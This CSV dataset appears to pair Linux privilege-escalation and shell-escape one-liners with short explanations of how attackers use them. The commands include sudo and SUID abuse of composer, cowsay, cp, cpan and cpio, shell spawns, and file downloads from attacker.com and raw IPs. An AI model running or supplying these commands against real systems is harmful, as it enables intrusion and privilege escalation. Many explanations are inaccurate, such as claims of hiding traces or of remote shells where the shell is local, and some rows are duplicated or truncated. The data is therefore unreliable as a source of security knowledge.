prompt,response
LFILE=file_to_read ; sudo column $LFILE,"Potential use: Reading and formatting the contents of a file with elevated privileges.
What it does: Formats the contents of the specified file into columns using whitespace as a delimiter, with elevated privileges granted by the 'sudo' command."
LFILE=file_to_read ; comm $LFILE /dev/null 2>/dev/null,"This command can be used to read the contents of a file and hide the output, potentially allowing an attacker to steal sensitive information without being detected."
sudo install -m =xs $(which comm) . ;  ; LFILE=file_to_read ; comm $LFILE /dev/null 2>/dev/null,"This command installs the ""comm"" command with elevated permissions and then uses it to compare the contents of a specified file with /dev/null, effectively hiding any output from the comparison. It could potentially be used to hide the exfiltration of data from a compromised machine."
LFILE=file_to_read ; sudo comm $LFILE /dev/null 2>/dev/null,This command can be used to read the contents of a file as root without leaving any trace in the shell history or logs.
"TF=$(mktemp -d) ; echo '{""""scripts"""":{""""x"""":""""/bin/sh -i 0<&3 1>&3 2>&3""""}}' >$TF/composer.json ; composer --working-dir=$TF run-script x","This command can be used to execute a reverse shell payload by creating a temporary directory, writing a composer.json file with a malicious script, and running the composer command to execute the script."
"TF=$(mktemp -d) ; echo '{""""scripts"""":{""""x"""":""""/bin/sh -i 0<&3 1>&3 2>&3""""}}' >$TF/composer.json ; sudo composer --working-dir=$TF run-script x","This command can be used to execute a reverse shell payload on a Linux machine by creating a temporary directory, writing a composer.json file with a malicious script, and running the composer command with elevated privileges to execute the payload."
"sudo install -m =xs $(which composer) . ;  ; TF=$(mktemp -d) ; echo '{""""scripts"""":{""""x"""":""""/bin/sh -i 0<&3 1>&3 2>&3""""}}' >$TF/composer.json ; ./composer --working-dir=$TF run-script x",This command installs Composer and creates a temporary directory to run a script that opens a shell with file descriptor 3. It can be used to gain remote access to a Linux machine by exploiting Composer's ability to execute scripts.
"TF=$(mktemp) ; echo 'exec """"/bin/sh"""";' >$TF ; cowsay -f $TF x","This command creates a temporary file, writes a command to execute a shell in it, and then uses the cow ASCII art generator to display the letter ""x"" with the cow saying the contents of the temporary file, potentially allowing an attacker to execute arbitrary commands on the target machine."
"TF=$(mktemp) ; echo 'exec """"/bin/sh"""";' >$TF ; sudo cowsay -f $TF x","This command can be used for privilege escalation by creating a temporary file with a shell command and executing it with sudo, while also disguising the command output with the cow ASCII art."
"TF=$(mktemp) ; echo 'exec """"/bin/sh"""";' >$TF ; cowthink -f $TF x","This command creates a temporary file, writes a command to execute a shell in it, and then uses the cowthink command to execute the file, potentially allowing an attacker to gain access to a shell on the Linux machine."
"TF=$(mktemp) ; echo 'exec """"/bin/sh"""";' >$TF ; sudo cowthink -f $TF x","This command creates a temporary file, writes a command to execute a shell in it, and then uses the cowthink command to execute the file as a cow ASCII art, potentially allowing an attacker to execute arbitrary code as root on a Linux machine."
"LFILE=file_to_write ; echo """"DATA"""" | cp /dev/stdin """"$LFILE""""",This command can be used to write data to a file and potentially overwrite sensitive information on the targeted machine.
"LFILE=file_to_read ; cp """"$LFILE"""" /dev/stdout","This command can be used to read the contents of a file and print it to the console, potentially allowing an attacker to exfiltrate sensitive information from a compromised system."
"sudo install -m =xs $(which cp) . ;  ; LFILE=file_to_write ; TF=$(mktemp) ; echo """"DATA"""" > $TF ; ./cp $TF $LFILE","This command can be used to elevate privileges and install a malicious copy of the 'cp' command, which can then be used to write arbitrary data to a specified file."
"sudo install -m =xs $(which cp) . ;  ; LFILE=file_to_write ; TF=$(mktemp) ; echo """"DATA"""" > $TF ; ./cp $TF $LFILE","This command can be used to elevate privileges and install a malicious copy of the 'cp' command, which can then be used to write arbitrary data to a specified file."
"LFILE=file_to_write ; TF=$(mktemp) ; echo """"DATA"""" > $TF ; sudo cp $TF $LFILE","This command can be used to write data to a file with elevated privileges, potentially allowing an attacker to modify sensitive system files or configuration files."
"LFILE=file_to_write ; TF=$(mktemp) ; echo """"DATA"""" > $TF ; sudo cp $TF $LFILE","This command can be used to write data to a file with elevated privileges, potentially allowing an attacker to modify sensitive system files or configuration files."
cpan ; ! exec '/bin/bash',"This command can be used to install Perl modules and then execute a Bash shell, potentially allowing an attacker to gain persistent access to the system."
"export RHOST=localhost ; export RPORT=9000 ; cpan ; ! use Socket; my $i=""""$ENV{RHOST}""""; my $p=$ENV{RPORT}; socket(S","This command sets up a socket connection to a specified host and port, potentially allowing an attacker to establish a remote connection to the victim machine and execute further commands."
cpan ; ! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();,"This command can be used to install the CPAN module and start an HTTP server on the machine, potentially allowing an attacker to host and serve malicious content."
"export URL=http://attacker.com/file_to_get ; cpan ; ! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();","This command sets an environment variable for a URL, installs the CPAN package manager, and uses the File::Fetch module to download a file from the specified URL. It could be used in a cyberattack to download and execute malicious code on a Linux machine."
"export URL=http://50.50.50.50/file_to_get ; cpan ; ! use File::Fetch; my $file = (File::Fetch->new(uri => """"$ENV{URL}""""))->fetch();","This command sets an environment variable for a specific IP address, installs the CPAN package manager, and uses the File::Fetch module to download a file from the specified URL. It could be used in a cyberattack to download and execute malicious code on a Linux machine."
"export URL=http://10.10.10.10/file_to_get ; cpan ; ! use File::Fetch; my $file = (File::Fetch->new(uri => """"$ENV{URL}""""))->fetch();","This command sets an environment variable for a URL, installs the CPAN package manager, and uses the File::Fetch module to download a file from the specified URL. It could be used in a cyberattack to download and execute malicious code on a Linux machine."
sudo cpan ; ! exec '/bin/bash',"This command can be used to install Perl modules and then execute a bash shell with elevated privileges, potentially allowing an attacker to gain persistent access to the system."
echo '/bin/sh </dev/tty >/dev/tty' >localhost ; cpio -o --rsh-command /bin/sh -F localhost:,"This command creates a malicious cpio archive that, when extracted, opens a shell with input/output redirected to the attacker's machine, allowing them to execute commands on the victim's machine remotely."
LFILE=file_to_write ; LDIR=where_to_write ; echo DATA >$LFILE ; echo $LFILE | cpio -up $LDIR,"This command can be used to write data to a file and copy it to a specified directory using cpio, potentially allowing an attacker to exfiltrate data from a compromised machine."
"LFILE=file_to_read ; TF=$(mktemp -d) ; echo """"$LFILE"""" | cpio -dp $TF ; cat """"$TF/$LFILE""""","This command can be used to read the contents of a file and print it to the terminal, potentially allowing an attacker to access sensitive information on the targeted Linux machine."
"LFILE=file_to_read ; TF=$(mktemp -d) ; echo """"$LFILE"""" | cpio -dp $TF ; cat """"$TF/$LFILE""""","This command can be used to read the contents of a file and print it to the terminal, potentially allowing an attacker to access sensitive information on the targeted Linux machine."
